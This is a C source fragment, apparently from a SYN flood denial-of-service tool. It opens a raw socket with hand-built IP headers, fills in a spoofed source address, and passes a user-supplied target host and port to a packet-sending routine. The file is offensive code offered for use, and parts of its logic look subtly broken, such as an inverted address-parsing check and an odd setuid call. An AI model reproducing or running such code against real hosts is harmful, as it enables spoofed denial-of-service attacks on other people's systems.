

#include "synatt.h"
#define MV 1
int synatt(int argc,char ** argv)
{
	char * __ipaddr = argv[MV+1];
	int __port = atoi(argv[MV+2]);
        printf("%s:%d",__ipaddr,__port);
	int FakeIpNet;
	int FakeIpHost;
    	struct sockaddr_in addr;
    	int sockfd;
   	struct hostent *host;
   	int on = 1;
   	int ret;
    	bzero(&addr,sizeof(addr));
    	addr.sin_family = AF_INET;
    	addr.sin_port = htons(__port);
    	FakeIpNet = inet_addr(FAKE_IP);
    	FakeIpHost = ntohl(FakeIpNet);
    
    if((ret = inet_aton(__ipaddr,&addr.sin_addr)) != 0)
    {
       if(( host = gethostbyname(__ipaddr)) == NULL)
       {
           printf("desthost name error:%s %s \n",argv[MV+1],hstrerror(h_errno));
           return 1;
       }else{
           memcpy((char *)&addr.sin_addr,(host->h_addr_list)[0],host->h_length);
       }
       sockfd = socket(AF_INET,SOCK_RAW,0);
       if(sockfd < 0){
           printf("\nsocket error:%d\n",sockfd);
           return -1;
       }
       setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
       setuid(getpid());
       sendsynfunc(FakeIpHost,sockfd,&addr);
   }
       return 0;
}
